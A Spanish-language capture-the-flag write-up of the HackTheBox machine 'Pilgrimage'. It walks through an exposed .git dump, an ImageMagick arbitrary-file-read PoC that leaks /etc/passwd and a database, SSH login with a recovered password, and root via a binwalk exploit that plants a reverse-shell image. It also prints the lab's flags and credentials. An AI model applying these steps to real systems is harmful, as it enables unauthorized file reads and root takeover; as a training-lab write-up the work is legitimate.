---
title: Pilgrimage HTB
date: 2023-07-11
tier: easy
author: naibu3
---
#linux #web #imagemagick #git

## Reconocimiento

Como siempre comenzamos lanzando [[nmap]], para tratar de buscar puertos abiertos:

```bash
sudo nmap -sS -p- --min-rate 5000 -n -Pn 10.10.11.219 -vvv
```
```nmap
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

```bash
sudo nmap -sCV -p22,80 -n 10.10.11.219 -vvv
```
```nmap
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Si accedemos a la ip via web, nos encontraremos con que se nos redirige a `pilgrimage.htb`. Lo añadimos al `/etc/hosts` y ya podremos ver una *subida de archivos*, una pestaña de *login* y otra de *registro*.

Con [[whatweb]] podemos ver que tecnologías utiliza la web:

```whatweb
http://pilgrimage.htb [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.219], JQuery, Script, Title[Pilgrimage - Shrink Your Images], nginx[1.18.0]
```

Aunque no vemos nada.

A continuación, podemos tratar de buscar recursos, comenzamos con [[dirb 1]]:

```dirb
---- Scanning URL: http://pilgrimage.htb/.git/ ----
+ http://pilgrimage.htb/.git/config (CODE:200|SIZE:92)
==> DIRECTORY: http://pilgrimage.htb/.git/hooks/
+ http://pilgrimage.htb/.git/index (CODE:200|SIZE:3768)
==> DIRECTORY: http://pilgrimage.htb/.git/info/
==> DIRECTORY: http://pilgrimage.htb/.git/logs/
==> DIRECTORY: http://pilgrimage.htb/.git/objects/
```

Como va un poco lento vamos a continuar con [[gobuster]], tanto en **hooks**, como en **info** y **logs** no vemos nada interesante, así que probamos en **objects**:

```bash
sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://pilgrimage.htb/.git/objects -t 20
```
```gobuster
/.htpasswd (Status: 403) [Size: 153]
/.hta (Status: 403) [Size: 153]
/.htaccess (Status: 403) [Size: 153]
/06 (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/objects/06/]
/11 (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/objects/11/]
/23 (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/objects/23/]
/50 (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/objects/50/]
/96(Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/objects/96/]
/ca  (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/objects/ca/]
/cd (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/objects/cd/]
/dc (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/objects/dc/]
/fa (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/objects/fa/]
/fb (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/objects/fb/]
/info (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/objects/info/]
/pack (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/objects/pack/]
```

Como hay muchos recursos, lo mejor es utilizar una herramienta como [[git-dumper]] para volcarnos todo el repositorio en local:

```bash
git-dumper -j4 http://pilgrimage.htb/.git/ ./git
```

Si entramos y echamos un vistazo a los archivos, en la raíz encontramos [[ImageMagick 1]], si lo ejecutamos con el parámetro `--version`, podremos listar la versión:

```bash
./magick --version
```
```magick
Version: ImageMagick 7.1.0-49 beta[...]
```

Si hacemos una búsqueda en internet, encontraremos una vuln llamada [Arbitrary File Read](https://www.exploit-db.com/exploits/51261).

## Explotación

Ejecutamos el comando de la PoC:

```bash
cargo run "/etc/passwd"
```

Nos dará como resultado una imagen que debemos subir a la web para que se procese. Una vez acabe, nos descargamos ola imagen con [[wget]] y ejecutamos el siguiente comando de [[ImageMagick 1]]:

```bash
identify -verbose 64ad72b7d4c8b.png
```
```identify
Raw profile type: 
    1437
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73
62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d
5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e
6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334
3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e
2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374
656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72
6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65
6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e
0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052
65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973
74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573
796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69
7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c
6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d
652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78
3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f
737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a
```

Si lo analizamos en [cyberchef]():

```xml
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Vemos que efectivamente podemos listar el `/etc/hosts`. Ahora tenemos los posibles usuarios **root** y **emily**. Además revisando el archivo `register.php` del repo, podemos ver que existe una BD (`sqlite:/var/db/pilgrimage`). Por tanto podemos tratar de listar dicho archivo:

```bash
cargo run "/var/db/pilgrimage"
```

Si repetimos el proceso, encontramos la cadena `-emilyabigchonkyboi123`.

Si probamos a conectarnos por ssh con las credenciales `emily:abigchonkyboi123`, son válidas, por lo que ya tenemos la **flag del usuario**!

```flag
eaa990cb07004e074f0fcbf73dde742f
```

## Escalada de privilegios

Una vez dentro debemos aplicar un [[Reconocimiento del equipo]], por lo que lanzamos [[pspy]]. Entre otros procesos, encontramos una tarea que ejecuta `/usr/sbin/malwarescan.sh` periodicamente:

```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
	binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
		if [[ "$binout" == *"$banned"* ]]; then
			/usr/bin/rm "$filename"
			break
		fi
	done
done
```

Vemos que está utilizando [[binwalk]], si lo ejecutamos vemos que está en la versión `2.3.2`, que resulta ser vulnerable.

Para obtener una shell como root podemos usar el siguiente [exploit](https://www.exploit-db.com/exploits/51249). Una vez ejecutado generará una imagen que contiene una **reverse shell**, la copiamos a `/var/www/pilgrimage.htb/shrunk/`, y nos ponemos en escucha en nuestra máquina local con [[netcat]]. Después lo accedemos con [[wget]] (`http://pilgrimage.htb/shrunk/binwalk_exploit.png`). Y ya deberíamos tener una shell como root en netcat. Si leemos `/root/root.txt` ya tenemos la **flag**!

```flag
99a960fd480eeb9e0915775c49c78db3
```

